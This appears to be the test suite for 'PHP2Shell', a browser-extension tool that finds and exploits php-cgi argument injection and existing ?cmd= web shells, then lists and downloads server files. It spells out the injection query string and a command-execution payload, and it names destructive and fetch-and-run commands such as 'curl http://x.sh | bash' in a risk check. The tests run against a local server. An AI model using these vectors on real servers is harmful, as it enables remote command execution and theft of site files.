/* =============================================================================
 *  PHP2Shell Extension — engine unit + integration tests
 * =============================================================================
 *
 *  ⚠️  The integration part talks to a LOCAL vulnerable php-cgi server that is
 *  started on 127.0.0.1 by tests/vuln-server.js. Nothing leaves the machine.
 *
 *  Run with:  node --test tests/
 * =============================================================================
 */

'use strict';

const test = require('node:test');
const assert = require('node:assert');
const path = require('path');

const engine = require(path.join(__dirname, '..', 'core', 'engine.js'));
const { startServer, startPlainServer, apacheBuildArgs, findPhpCgi } = require('./vuln-server.js');

/* -------------------------------------------------------------------------- */
/*  Offline analysis                                                          */
/* -------------------------------------------------------------------------- */

test('parseTarget extracts origin, path and parameters', () => {
  const t = engine.parseTarget('http://example.com/a/b.php?cmd=whoami&x=1');
  assert.strictEqual(t.origin, 'http://example.com');
  assert.strictEqual(t.host, 'example.com');
  assert.strictEqual(t.path, '/a/b.php');
  assert.deepStrictEqual(t.params.map((p) => p.name), ['cmd', 'x']);
});

test('parseTarget rejects non-http(s) URLs', () => {
  assert.strictEqual(engine.parseTarget('chrome://extensions'), null);
  assert.strictEqual(engine.parseTarget('file:///etc/passwd'), null);
  assert.strictEqual(engine.parseTarget('not a url'), null);
});

test('analyzeUrl flags command-like query parameters', () => {
  const res = engine.analyzeUrl('http://target.local/index.php?cmd=cat+/etc/passwd');
  assert.ok(res.evidence.some((e) => /cmd/i.test(e.title)));
  assert.ok(res.evidence.some((e) => e.severity === 'high'));
});

test('analyzeUrl flags the php-cgi injection query shape', () => {
  const res = engine.analyzeUrl(
    'http://target.local/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input');
  assert.ok(res.evidence.some((e) => /argument injection/i.test(e.title)));
});

test('analyzeUrl flags known shell filenames in the path', () => {
  const res = engine.analyzeUrl('http://target.local/uploads/c99.php');
  assert.ok(res.evidence.some((e) => /web-shell filename/i.test(e.title)));
});

test('analyzeUrl on a clean URL produces no high severity evidence', () => {
  const res = engine.analyzeUrl('https://example.com/blog/post?id=42');
  const worst = res.evidence.reduce((acc, e) =>
    ({ critical: 4, high: 3, medium: 2, low: 1 }[e.severity] > { critical: 4, high: 3, medium: 2, low: 1 }[acc]
      ? e.severity : acc), 'info');
  assert.notStrictEqual(worst, 'critical');
  assert.notStrictEqual(worst, 'high');
});

test('candidateScripts prefers .php entry points', () => {
  const t = engine.parseTarget('http://target.local/app/index.php');
  const scripts = engine.candidateScripts(t);
  assert.strictEqual(scripts[0], '/app/index.php');

  const t2 = engine.parseTarget('http://target.local/app/');
  assert.ok(engine.candidateScripts(t2).includes('/app/index.php'));
});

/* -------------------------------------------------------------------------- */
/*  Payload construction                                                      */
/* -------------------------------------------------------------------------- */

test('marker payload contains the token and nothing destructive', () => {
  const p = engine.markerPayload('abc123');
  assert.ok(p.includes('P2S_MARK_abc123'));
  assert.ok(p.startsWith('<?php'));
  assert.ok(!/shell_exec|system\(|passthru/.test(p));
});

test('command payload base64-encodes the command and delimits the output', () => {
  const cmd = 'cat /etc/passwd';
  const p = engine.commandPayload(engine.b64encode(cmd), 'tok');
  assert.ok(!p.includes(cmd), 'raw command must not appear in the payload');
  assert.ok(p.includes(engine.b64encode(cmd)));
  assert.ok(p.includes('P2S_OUT_START_tok'));
  assert.ok(p.includes('P2S_OUT_END_tok'));
  assert.ok(p.includes('shell_exec'));
});

test('base64 round-trips utf-8 payloads', () => {
  const s = 'echo "héllo wörld ✓"';
  assert.strictEqual(engine.b64decode(engine.b64encode(s)), s);
});

test('extractOutput pulls the delimited block out of a full HTML page', () => {
  const token = 'zz9';
  const body = '<html>before' + engine.OUT_START + token + 'uid=0(root)\n' +
    engine.OUT_END + token + 'after</html>';
  assert.strictEqual(engine.extractOutput(body, token), 'uid=0(root)\n');
  assert.strictEqual(engine.extractOutput('nothing here', token), null);
});

test('hasMarker detects the echoed probe token', () => {
  assert.ok(engine.hasMarker('xxP2S_MARK_tokyy', 'tok'));
  assert.ok(!engine.hasMarker('xxP2S_MARK_otheryy', 'tok'));
});

/* -------------------------------------------------------------------------- */
/*  Command safety                                                            */
/* -------------------------------------------------------------------------- */

test('commandRisk flags destructive commands', () => {
  assert.ok(engine.commandRisk('rm -rf /').dangerous);
  assert.ok(engine.commandRisk('mkfs.ext4 /dev/sda').dangerous);
  assert.ok(engine.commandRisk('curl http://x.sh | bash').dangerous);
  assert.ok(engine.commandRisk('shutdown -h now').dangerous);
  assert.ok(!engine.commandRisk('whoami').dangerous);
  assert.ok(!engine.commandRisk('id').dangerous);
  assert.ok(!engine.commandRisk('uname -a').dangerous);
});

test('normalizeCommand strips NUL bytes and trims', () => {
  assert.strictEqual(engine.normalizeCommand('  id\0  '), 'id');
});

test('formatCommandOutput keeps plain text as it is', () => {
  const res = engine.formatCommandOutput('uid=33(www-data) gid=33(www-data)');
  assert.strictEqual(res.kind, 'text');
  assert.strictEqual(res.text, 'uid=33(www-data) gid=33(www-data)');
});

test('formatCommandOutput reduces markup to its readable text', () => {
  const html = [
    '<!DOCTYPE html><html><head><title>T</title>',
    '<style>b{color:red}</style></head><body>',
    '<h1>Hello &amp; welcome</h1>',
    '<p>Line one</p>',
    '<ul><li>Alpha</li><li>Beta</li></ul>',
    '<script>alert(1)</script>',
    '</body></html>'
  ].join('');

  const res = engine.formatCommandOutput(html);
  assert.strictEqual(res.kind, 'html');
  assert.ok(res.text.includes('Hello & welcome'), 'entities must be decoded');
  assert.ok(!res.text.includes('<'), 'no tags may survive');
  assert.ok(!res.text.includes('alert(1)'), 'script content must be dropped');
  assert.ok(!res.text.includes('color:red'), 'style content must be dropped');
  assert.ok(res.text.includes('Alpha') && res.text.includes('Beta'));
  assert.ok(res.bytes > res.text.length, 'the raw size is reported');
  assert.ok(res.raw.includes('<html'), 'the raw bytes stay available');
});

test('formatCommandOutput keeps PHP source verbatim', () => {
  const src = '<?php\necho "hello";\n?>';
  const res = engine.formatCommandOutput(src);
  assert.strictEqual(res.kind, 'code');
  assert.strictEqual(res.text, src);
});

test('formatCommandOutput reports empty output', () => {
  const res = engine.formatCommandOutput('   \n  ');
  assert.strictEqual(res.kind, 'empty');
  assert.strictEqual(res.text, '');
});

test('stripHtml keeps the document structure', () => {
  const text = engine.stripHtml('<p>one</p><p>two</p><br><p>three</p>');
  assert.ok(text.includes('one'));
  assert.ok(text.includes('two'));
  assert.ok(text.includes('three'));
  assert.ok(text.split('\n').length >= 3, 'block elements become line breaks');
});

test('decodeEntities understands numeric and named entities', () => {
  assert.strictEqual(engine.decodeEntities('a&amp;b'), 'a&b');
  assert.strictEqual(engine.decodeEntities('&#65;&#x42;'), 'AB');
  assert.strictEqual(engine.decodeEntities('&lt;tag&gt;'), '<tag>');
});

/* -------------------------------------------------------------------------- */
/*  Apache argument emulation (mirrors modules/generators/mod_cgi.c)           */
/* -------------------------------------------------------------------------- */

test('apacheBuildArgs splits the query string on + and unescapes it', () => {
  const args = apacheBuildArgs('-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input');
  assert.deepStrictEqual(args, [
    '-d', 'allow_url_include=1', '-d', 'auto_prepend_file=php://input'
  ]);
});

test('apacheBuildArgs refuses query strings containing a literal =', () => {
  assert.deepStrictEqual(apacheBuildArgs('-d+allow_url_include=1'), []);
});

/* -------------------------------------------------------------------------- */
/*  Integration: real php-cgi on localhost                                    */
/* -------------------------------------------------------------------------- */

test('integration: detects and exploits a vulnerable php-cgi target', async (t) => {
  if (!findPhpCgi()) {
    t.skip('php-cgi binary not available');
    return;
  }

  const srv = await startServer();
  t.after(() => srv.close());

  const target = engine.parseTarget(srv.origin + '/index.php');
  const scripts = engine.candidateScripts(target).map((p) => new URL(p, target.origin).href);
  const token = engine.randomToken(10);

  /* --- strategy A: look for a pre-existing command channel --------------- */
  const existing = await engine.probeExistingShell({
    target, token, script: scripts[0], timeoutMs: 8000, maxParams: 4
  });
  assert.strictEqual(existing.found, false, 'a clean page must not look like a shell');

  /* --- strategy B: php-cgi argument injection ---------------------------- */
  const inj = await engine.probeInjection({ scripts, token, timeoutMs: 8000 });
  assert.strictEqual(inj.found, true, 'php-cgi argument injection must be detected');
  assert.strictEqual(inj.strategy, 'cgi-injection');
  assert.ok(inj.vector.query.includes('auto_prepend_file'));

  /* --- command execution through the confirmed vector --------------------- */
  const res = await engine.executeCommand({
    vector: inj.vector,
    command: 'echo P2S_CANARY_987654',
    token: engine.randomToken(8),
    timeoutMs: 15000
  });
  assert.ok(res.extracted, 'output delimiters must be present in the response');
  assert.ok(res.output.includes('P2S_CANARY_987654'), 'command output must round-trip');

  const who = await engine.executeCommand({
    vector: inj.vector,
    command: 'id -u',
    token: engine.randomToken(8),
    timeoutMs: 15000
  });
  assert.ok(/^\d+$/m.test(who.output.trim()), 'id -u must return a uid');
});

test('integration: a clean non-PHP site is not reported as vulnerable', async (t) => {
  const srv = await startPlainServer();
  t.after(() => srv.close());

  const target = engine.parseTarget(srv.origin + '/');
  const scripts = engine.candidateScripts(target).map((p) => new URL(p, target.origin).href);
  const token = engine.randomToken(10);

  const inj = await engine.probeInjection({ scripts, token, timeoutMs: 5000 });
  assert.strictEqual(inj.found, false);
});

test('integration: unix mode is NOT flagged (php-cgi blocks the classic -d vector)', async (t) => {
  if (!findPhpCgi()) {
    t.skip('php-cgi binary not available');
    return;
  }

  /* On Linux/Apache php-cgi ignores the injected options when the decoded
   * QUERY_STRING starts with '-' (the CVE-2012-1823 mitigation), so the
   * detector must stay silent instead of crying wolf. */
  const srv = await startServer({ mode: 'unix' });
  t.after(() => srv.close());

  const target = engine.parseTarget(srv.origin + '/index.php');
  const scripts = engine.candidateScripts(target).map((p) => new URL(p, target.origin).href);
  const token = engine.randomToken(10);

  const inj = await engine.probeInjection({ scripts, token, timeoutMs: 8000 });
  assert.strictEqual(inj.found, false,
    'php-cgi on Linux refuses the -d injection — no false positive allowed');
  assert.ok(inj.tried.length > 0, 'the probe must actually have tried something');
});

test('integration: finds and uses a pre-planted web shell (?cmd=)', async (t) => {
  if (!findPhpCgi()) {
    t.skip('php-cgi binary not available');
    return;
  }

  const srv = await startServer({ mode: 'unix' });
  t.after(() => srv.close());

  const shellUrl = srv.origin + '/shell.php';
  const target = engine.parseTarget(shellUrl);
  const token = engine.randomToken(10);

  const found = await engine.probeExistingShell({
    target, token, script: shellUrl, timeoutMs: 8000, maxParams: 10
  });
  assert.strictEqual(found.found, true, 'the planted shell must be detected');
  assert.strictEqual(found.vector.param, 'cmd');

  const res = await engine.executeCommand({
    vector: found.vector,
    command: 'echo P2S_CANARY_424242',
    token: engine.randomToken(8),
    timeoutMs: 15000
  });
  assert.ok(res.output.includes('P2S_CANARY_424242'), 'command output must round-trip');
});

/* -------------------------------------------------------------------------- */
/*  Directory listing → download plan                                         */
/* -------------------------------------------------------------------------- */

test('parseLsOutput reads a plain `ls -la` listing', () => {
  const out = [
    'total 28',
    'drwxr-xr-x 4 www-data www-data 4096 Jan 21 10:33 .',
    'drwxr-xr-x 2 www-data www-data 4096 Jan 21 10:33 ..',
    '-rw-r--r-- 1 www-data www-data  1024 Jan 21 10:33 index.php',
    '-rw-r--r-- 1 www-data www-data   512 Jan 21 09:12 info.php',
    'drwxr-xr-x 3 www-data www-data 4096 Jan 20 18:02 uploads',
    'lrwxrwxrwx 1 www-data www-data     9 Jan 21 10:33 old.php -> index.php',
    '-rw-r--r-- 1 www-data www-data  2048 Feb  3  2025 notes with spaces.txt'
  ].join('\n');

  const entries = engine.parseLsOutput(out);
  assert.strictEqual(entries.length, 7);

  const index = entries.find((e) => e.name === 'index.php');
  assert.strictEqual(index.size, 1024);
  assert.strictEqual(index.isDir, false);
  assert.strictEqual(index.perms, '-rw-r--r--');

  const uploads = entries.find((e) => e.name === 'uploads');
  assert.strictEqual(uploads.isDir, true);

  const link = entries.find((e) => e.name === 'old.php');
  assert.strictEqual(link.isLink, true);
  assert.strictEqual(link.linkTarget, 'index.php');

  const spaced = entries.find((e) => e.name === 'notes with spaces.txt');
  assert.strictEqual(spaced.size, 2048);
});

test('parseLsOutput attributes entries to their directory in `ls -laR` output', () => {
  const out = [
    '/var/www/html:',
    'total 8',
    '-rw-r--r-- 1 www-data www-data  100 Jan 21 10:33 index.php',
    '',
    '/var/www/html/uploads:',
    'total 4',
    '-rw-r--r-- 1 www-data www-data   50 Jan 21 10:33 a.txt'
  ].join('\n');

  const entries = engine.parseLsOutput(out);
  assert.strictEqual(entries.length, 2);
  assert.strictEqual(entries[0].dir, '/var/www/html');
  assert.strictEqual(entries[1].dir, '/var/www/html/uploads');
  assert.strictEqual(entries[1].name, 'a.txt');
});

test('parseListingOutput splits the environment header from the listing', () => {
  const raw = [
    '__P2S_DOCROOT=/var/www/html',
    '__P2S_SCRIPT=/index.php',
    '__P2S_PWD=/var/www/html',
    'total 4',
    '-rw-r--r-- 1 www-data www-data  100 Jan 21 10:33 index.php'
  ].join('\n');

  const parsed = engine.parseListingOutput(raw);
  assert.strictEqual(parsed.meta.docroot, '/var/www/html');
  assert.strictEqual(parsed.meta.script, '/index.php');
  assert.strictEqual(parsed.meta.cwd, '/var/www/html');
  assert.strictEqual(parsed.entries.length, 1);
  assert.strictEqual(parsed.entries[0].name, 'index.php');
});

test('buildListingCommand asks for ls and for the server environment', () => {
  const cmd = engine.buildListingCommand({ dir: '/var/www/html', recursive: false });
  assert.ok(cmd.includes('ls -la'));
  assert.ok(cmd.includes("'/var/www/html'"));
  assert.ok(cmd.includes('DOCUMENT_ROOT'));
  assert.ok(!cmd.includes('ls -laR'));

  const rec = engine.buildListingCommand({ dir: '', recursive: true });
  assert.ok(rec.includes('ls -laR'));
  assert.ok(rec.includes("'.'"));
});

test('shellQuote neutralises quotes and spaces', () => {
  assert.strictEqual(engine.shellQuote('a b'), "'a b'");
  assert.strictEqual(engine.shellQuote("it's"), "'it'\\''s'");
});

test('buildDownloadPlan maps the listing onto same-origin URLs', () => {
  const entries = engine.parseLsOutput([
    'drwxr-xr-x 2 www-data www-data 4096 Jan 21 10:33 uploads',
    '-rw-r--r-- 1 www-data www-data 1024 Jan 21 10:33 index.php',
    'lrwxrwxrwx 1 www-data www-data    9 Jan 21 10:33 link -> index.php'
  ].join('\n'));

  const plan = engine.buildDownloadPlan({
    origin: 'http://127.0.0.1:8080',
    docroot: '/var/www/html',
    cwd: '/var/www/html',
    entries,
    rootName: 'p2s-test'
  });

  assert.strictEqual(plan.files.length, 1);
  assert.strictEqual(plan.files[0].url, 'http://127.0.0.1:8080/index.php');
  assert.strictEqual(plan.files[0].filename, 'p2s-test/index.php');
  assert.strictEqual(plan.files[0].size, 1024);

  const skipped = plan.skipped.map((s) => s.reason);
  assert.ok(skipped.includes('directory'));
  assert.ok(skipped.includes('symlink'));
});

test('buildDownloadPlan keeps sub-directories and blocks traversal', () => {
  const entries = engine.parseLsOutput([
    '-rw-r--r-- 1 www-data www-data 100 Jan 21 10:33 a.txt'
  ].join('\n'));
  entries[0].dir = '/var/www/html/uploads';

  const plan = engine.buildDownloadPlan({
    origin: 'http://host',
    docroot: '/var/www/html',
    cwd: '/var/www/html',
    entries,
    rootName: 'p2s-test'
  });

  assert.strictEqual(plan.files[0].url, 'http://host/uploads/a.txt');
  assert.strictEqual(plan.files[0].filename, 'p2s-test/uploads/a.txt');
  assert.ok(!plan.files[0].filename.includes('..'));
});

test('buildDownloadPlan skips files outside the document root', () => {
  const entries = engine.parseLsOutput([
    '-rw-r--r-- 1 www-data www-data 100 Jan 21 10:33 passwd'
  ].join('\n'));
  entries[0].dir = '/etc';

  const plan = engine.buildDownloadPlan({
    origin: 'http://host',
    docroot: '/var/www/html',
    cwd: '/etc',
    entries,
    rootName: 'p2s-test'
  });

  assert.strictEqual(plan.files.length, 0);
  assert.ok(plan.skipped.some((s) => s.reason === 'outside document root'));
});
